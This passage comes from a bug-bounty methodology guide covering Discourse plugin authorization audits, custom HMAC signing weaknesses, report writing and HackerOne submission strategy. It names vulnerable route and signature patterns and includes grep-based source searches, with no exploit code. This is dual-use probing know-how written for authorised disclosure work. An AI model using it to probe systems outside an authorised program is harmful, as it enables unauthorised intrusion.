  log = current_user.ai_api_audit_logs.find(params[:id])  # ← Scoped!
```

**Search pattern**:
```bash
# Find controller actions using unscoped find()
grep -rn "\.find(params\[:id\])" plugins/*/app/controllers/ --include='*.rb'

# Check if the result is scoped before rendering
# Look for missing `current_user.` or `resource.where(owner: current_user)` patterns
```

### 8.4 Check Guardian/Policy Extensions

Plugins often extend the core guardian. Check if the extension methods check:
1. **Anonymous guard**: `return false if anonymous?` / `return false if !user`
2. **Scope check**: Does it verify the user owns the resource?
3. **Group configuration**: Is the permission gated behind a `SiteSetting.*_allowed_groups_map`? If the group is empty, the check always fails → false sense of security.
4. **Fallthrough**: What happens if the site setting is missing? If `SiteSetting.some_group.any?` is `false`, does the method return `false` correctly?

### 8.5 Serializer Data Check

When an endpoint returns model data, check what the serializer exposes:
```bash
grep -rn "attributes\|has_one\|has_many" plugins/*/app/serializers/ --include='*.rb'
```
Look for fields named `raw_*`, `payload`, `secret`, `token`, `key`, `password`, `private_*`. These are often included for convenience but shouldn't be exposed to non-owners.

### 8.6 Plugin Routes Fingerprint

Common vulnerable patterns in plugin routes:
- `get "show-debug-info/:id"` — Debug endpoints often have weaker auth
- `post "hooks"`, `post "webhooks"` — Webhook handlers skip CSRF
- `get "forms/:id"` — Unauthenticated form access
- `post "interactions"` — External service integration
- `get "*key/share"` — Shared content by key

## Phase 8: Custom API Auth Schemes — HMAC Signature Testing

When an API uses custom HMAC request signing, test these patterns:

### Common HMAC Formula Variations
- Standard: `base64(hmac-sha256(key, message))`
- Non-standard (Rapyd, etc.): `base64(hex(hmac-sha256(key, message)))` — hex-encode the hash FIRST, then base64 the hex string
- Double-encoded: some implementations encode the output twice
- Key-in-message: some designs include the secret key as BOTH the HMAC key AND concatenated into the message (self-referential design — red flag)

### Verification Steps
1. Check the official docs for the exact formula — the code example is authoritative
2. Read the implementation in multiple languages — sometimes PHP/Node.js/Python versions differ
3. Test against the sandbox API with a known payload before assuming your implementation is correct
4. Verify with a simple GET request (no body) first, then POST with body

### Vulnerability Patterns in Custom HMAC
- **Self-referential HMAC**: Secret key in both key and message. If `toSign` string leaks (logs, error messages), the key is exposed.
- **Hardcoded URL components**: Webhook signatures that hardcode the merchant URL instead of deriving it from the request break signature validation.
- **Missing auth on certain endpoints**: Check if every endpoint requires signature headers.
- **Signature not checked on certain HTTP methods**: GET endpoints sometimes skip validation.
- **Idempotency not enforced**: Even if defined, may be `required: false` — enabling replay attacks.

## Phase 9: Report Writing & Submission Checklist

### Structure (from Bug Bounty Bootcamp Ch2)
1. **Title**: Clear, descriptive (e.g., "Authentication Bypass via NoSQL Injection in Login API")
2. **Summary**: 2-3 sentence overview of the vulnerability
3. **Severity**: CVSS score + rationale
4. **Steps to Reproduce**: Bullet-point numbered steps starting from registration
5. **PoC**: Code or request/response pairs demonstrating exploitation
6. **Impact**: Worst-case scenario (data access, RCE, account takeover)
7. **Fix Recommendation**: Specific code changes or architecture improvements

### Report Directory Structure
```
~/Dev/REPORTS/<Program>/<SubmissionNumber>/<finding-name>/
├── REPORT.md           ← Standalone writeup. NOT in zip. Read this first.
└── poc/
    ├── poc-pocname.py  ← Working exploit/PoC script
    └── submission.zip  ← PoC archive for HackerOne upload
```

- **Reports** go in `~/Dev/REPORTS/<Program>/<SubmissionNumber>/<finding-name>/REPORT.md`
- **PoC code and test scripts** written during hunting go on `~/Dev/` root level (not inside reports)
- **Source repos** cloned to `~/Dev/<vendor>/` stay at root (e.g., `~/Dev/gitlab/gitlab/`, `~/Dev/discourse/discourse/`)
- **Archive conventions**: REPORT.md at folder root, NOT inside the zip. Zip contains only PoC code + README.

### CVSS Calculator
- GitLab uses custom CVSS calculator: https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/
- Include CVSS vector string in report for automated triage
- Current GitLab bounty ranges: Critical $20k-$35k, High $5k-$15k, Med $1k-$2.5k, Low $100-$750

## Submission Strategy (Avoiding Duplicates)

On HackerOne with **limited slots for new researchers** (typically 5 initial submissions before reputation gates kick in), every report must count. Duplicates burn through limited slots without payout. Two duplicate submissions out of three is enough to run out of chances quickly.

### Program Selection (also see Phase 7)

1. **Pick programs where we have an edge**: Tech stack we know (Node.js/TypeScript, Ruby on Rails), source code accessible, less saturated than GitLab/Vercel level. Avoid SSRF-heavy programs — it's the most crowded finding class.
2. **Check if bounties are real**: Some programs have suspended bounties (Discourse, Node.js, IBB). Verify via recent community reports or HackerOne program page before investing time.
3. **Avoid crowded vulnerability classes**: SSRF is the most-reported bug in many programs (Vercel's AI SDK had duplicate SSRF reports). Look for less-trodden ground: authorization gaps in NEW features (AI chat, workflows, plugins, import/export), business logic flaws, race conditions, template injection.
4. **Newer features = less audited**: AI features, chat systems, workflow engines — these get less researcher attention than core SSRF/path-traversal bugs.

### Pre-Submission Fact-Check Checklist
Before submitting ANY report, verify:
1. **Check migration files** — `t.string` = varchar(255), `t.text` = unbounded. Don't claim full payload exposure for truncated columns.
2. **Trace the auth chain** — Read the guardian/policy file, not just the controller. Does it verify OWNERSHIP or just VISIBILITY?
3. **Test on live instance** — Verify the route exists, auth works as expected, and error codes match your claims.
4. **Check escalation claims** — Can you really enumerate IDs? Is the data really accessible cross-user? Or do rate limits / auth gates prevent it?
5. **Search for prior art** — Check recent disclosed reports, CVEs, GitHub security advisories for similar findings
6. **Be honest about severity** — A Medium with accurate analysis is worth more than a High with inflated claims. Signal rating matters.

### Report Structure Strategy
- **One report per independent root cause** — Different root causes, different fixes, different attack surfaces go in separate reports
- **Bundle escalation chains within a report** — Show how a single bug becomes critical through chaining, but keep it as ONE report
- **Don't bundle weak findings with strong ones** — "Also the webhooks skip CSRF" dilutes a good IDOR report. Weak findings hurt signal rating
- **Full escalation in the report** — Show what a real attacker would do, not just the bare minimum PoC
- **Include CVSS vector string** from the program's own calculator when available (GitLab has one)
- **Directories**: `~/Dev/REPORTS/<Program>/<#>/<finding-name>/REPORT.md` + `poc/` subfolder

## Bookshelf References

Located at `~/Documents/BOOKS/Hackinh/`:
- **Hacking APIs** (Corey Ball) — Part III (Attacking APIs), Part IV (Real-World)
- **Bug Bounty Bootcamp** (Vickie Li) — Ch10 IDOR, Ch14 Deserialization, Ch16 SSTI, Ch17 Logic, Ch21 Info Disclosure
- **Web App Hacker's Handbook** (Stuttard & Pinto) — Comprehensive web app testing
- **RTFM** (Ben Clark) — Red Team command reference

## External Resources
- **Jason Haddix TBHM**: https://github.com/jhaddix/tbhm
- **Rhino Security Labs**: https://rhinosecuritylabs.com/blog/ — Cloud pentesting, AWS/GCP/Azure
- **Sam Curry Blog**: https://samcurry.net — Real-world exploitation writeups
- **PortSwigger Web Security Academy**: https://portswigger.net/web-security — Free training + labs
- **SecLists**: https://github.com/danielmiessler/SecLists — Wordlists for fuzzing, user-agents, payloads
- **CVE Blogs**: vulnerability.blog, zeropath.com/blog/cve-analysis

### Reference Files / Worked Examples
- `references/nutaku-hal-recon-worked-example.md` — Full recon chain on a Spring HATEOAS + Laravel target (Aylo/Nutaku bug bounty). Demonstrates HAL API discovery, auth endpoint status-code fingerprinting (401 vs 400), actuator probing, DTO structure extraction from error messages, and technology stack identification across multiple subdomains.
- `references/nutaku-apk-analysis-and-gateway-auth.md` — Android APK reverse engineering for API discovery. Demonstrates OAuth2 client credentials flow identification, gateway auth endpoint mapping, sandbox/staging environment discovery, and the "not-in-APK plaintext" dead-end analysis technique.
